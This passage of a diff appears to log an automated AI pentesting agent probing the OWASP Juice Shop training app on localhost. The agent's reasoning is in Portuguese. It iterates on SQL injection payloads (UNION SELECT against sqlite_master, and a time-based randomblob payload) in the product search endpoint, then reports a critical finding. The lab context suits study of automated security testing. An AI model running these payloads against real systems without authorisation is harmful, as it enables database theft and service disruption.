+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/products/search?q=apple%25%27+OR+%271%27%3D%271%27+UNION+SELECT+null,null,null,null,null,null,null,null,null+FROM+sqlite_master+WHERE+%271%27%3D%272\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:25 GMT\",\"connection\":\"ke",
+      "timestamp": "2026-10-23T00:52:25.647Z"
+    },
+    {
+      "iteration": 35,
+      "thought": "O UNION é injetado dentro do LIKE do segundo termo também, o que quebra. Preciso fazer com que a condição do segundo LIKE seja sempre falsa ou nula. Usei WHERE '1'='2' mas ainda dentro do LIKE. Estrutura correta: `apple%' OR '1'='1' UNION SELECT ... --` com comentário que funcione. O problema é o `'` residual. Em SQLite, `||'` pode concatenar? Outra abordagem: usar `apple' OR '1'='1' UNION SELECT ... FROM Users WHERE 'a'='a` e deixar o `)` fechar. Mas o `%` residual... Vou tentar: `apple' UNION SELECT ... FROM Users-- ` com `--` seguido de newline? Não via URL. \n\nTentar time-based para confirmar blind: `apple%' AND randomblob(1000000000)--`. Preciso do comentário funcionar. Testar com `--` + espaço codificado.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple%25%27+AND+randomblob%281000000000%29--+",
+        "headers": {}
+      },
+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/products/search?q=apple%25%27+AND+randomblob%281000000000%29--+\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:29 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"363\"}\nBody:\n{\n  \"error\": {\n    \"",
+      "timestamp": "2026-10-23T00:52:29.452Z"
+    },
+    {
+      "iteration": 36,
+      "thought": "O `--` não comenta porque precisa estar imediatamente antes do newline; aqui há `%' OR...` após. Isso é inerente à query. Vou tentar usar `randomblob` sem comentário, deixando a query sintaticamente válida: `apple%' AND randomblob(1000000000) AND name LIKE '%`. A query fica: `name LIKE '%apple%' AND randomblob(...) AND name LIKE '%X%' OR description LIKE '%apple%' AND randomblob(...) AND description LIKE '%X%') AND deletedAt...)`. Para fazer o segundo termo válido, X pode ser qualquer coisa, mas o search insere nossa string em ambos. Então precisamos de payload que funcione em ambos os ORs. Use: `apple%' AND randomblob(1000000000) AND '%'='`. Testar.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple%25%27+AND+randomblob%281000000000%29+AND+%27%25%27%3D%27",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/products/search?q=apple%25%27+AND+randomblob%281000000000%29+AND+%27%25%27%3D%27\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"30\",\"etag\":\"W/\\\"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:42 GMT\",\"connection\":\"ke",
+      "timestamp": "2026-10-23T00:52:42.365Z"
+    },
+    {
+      "iteration": 37,
+      "thought": "Demorou ~13 segundos (timeout) e retornou vazio — time-based SQL Injection confirmada! O `randomblob` causou delay. Vou reportar SQLi e continuar explorando outras categorias. Antes disso, vou tentar extrair dados com UNION de forma alternativa: como a aplicação usa SQLite, posso tentar `q=' UNION SELECT ... --` com `--` funcionando se eu não deixar `'` residual. Payload: `') UNION SELECT ... --` não funciona porque adicionam `%` antes. \n\nVou tentar usar `q=` vazio e injetar `') UNION SELECT ... --` mas `)` bloqueado? Testar.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=%27%29+UNION+SELECT+null,null,null,null,null,null,null,null,null+FROM+sqlite_master--",
+        "headers": {}
+      },
+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/products/search?q=%27%29+UNION+SELECT+null,null,null,null,null,null,null,null,null+FROM+sqlite_master--\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:46 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-l",
+      "timestamp": "2026-10-23T00:52:46.659Z"
+    },
+    {
+      "iteration": 38,
+      "thought": "O UNION ainda dentro do LIKE. A sintaxe válida seria `name LIKE '%') UNION SELECT ... --%' OR description...` — mas o `--` não comenta. Preciso de `'))` para fechar, mas foi bloqueado. Vou tentar encode diferente para `))` — talvez `%2529%2529` (duplo encode).",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple%25%27%29%2529%20UNION%20SELECT%20null,null,null,null,null,null,null,null,null%20FROM%20sqlite_master--",
+        "headers": {}
+      },
+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/products/search?q=apple%25%27%29%2529%20UNION%20SELECT%20null,null,null,null,null,null,null,null,null%20FROM%20sqlite_master--\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:49 GMT\",\"connection\":\"keep-alive\",\"keep-alive\"",
+      "timestamp": "2026-10-23T00:52:49.313Z"
+    },
+    {
+      "iteration": 39,
+      "thought": "O `%29` não foi decodificado como `)` pelo servidor, foi tratado como literal `%29`. Vou reportar SQLi baseada em erro/time-based confirmada e seguir. Há evidência suficiente. Também posso explorar outro vetor: o endpoint de login pode ter SQLi/NoSQLi.",
+      "action": {
+        "action": "report_finding",
+        "title": "SQL Injection in /rest/products/search",
+        "severity": "CRITICAL",
+        "category": "Injection",
+        "description": "CWE-89 SQL Injection. O parâmetro 'q' do endpoint /rest/products/search é concatenado diretamente em uma query SQLite. Aspa simples causa erro SQL visível (SQLITE_ERROR). Payload time-based com randomblob(1000000000) causa delay de ~13s. Permite extração de dados do banco (usuários, senhas, pedidos) e potencial RCE via extensões SQLite.",
+        "steps": [
+          "GET /rest/products/search?q=apple' → 500 SQLITE_ERROR com query completa",
+          "GET /rest/products/search?q=apple%25'+AND+randomblob(1000000000)+AND+'%25'=' → demora >10s e retorna data vazio",
+          "GET /rest/products/search?q=apple%25'+OR+'1'='1 → retorna produtos"
+        ],
+        "evidence": "SQL exposta: SELECT * FROM Products WHERE ((name LIKE '%apple'%' OR description LIKE '%apple'%') AND deletedAt IS NULL) ORDER BY name; time-based delay confirmado"
+      },
+      "observation": "Finding registrado com sucesso.\nTítulo: \"SQL Injection in /rest/products/search\" | Severidade: CRITICAL\nTotal de findings até agora: 3.",
+      "timestamp": "2026-10-23T00:52:53.803Z"
+    },
+    {
+      "iteration": 40,
+      "thought": "Vou agora testar autenticação/login para SQLi/NoSQLi, e depois explorar XSS via formulário de contato e stored XSS. Primeiro, login.",
+      "action": {
+        "action": "navigate",
+        "url": "http://localhost:3000/#/login"
+      },
+      "observation": "Navegou para http://juice-shop:3000/#/login. Título: \"OWASP Juice Shop\". URL atual: http://juice-shop:3000/#/login",
+      "timestamp": "2026-10-23T00:52:55.775Z"
+    }
+  ]
+}
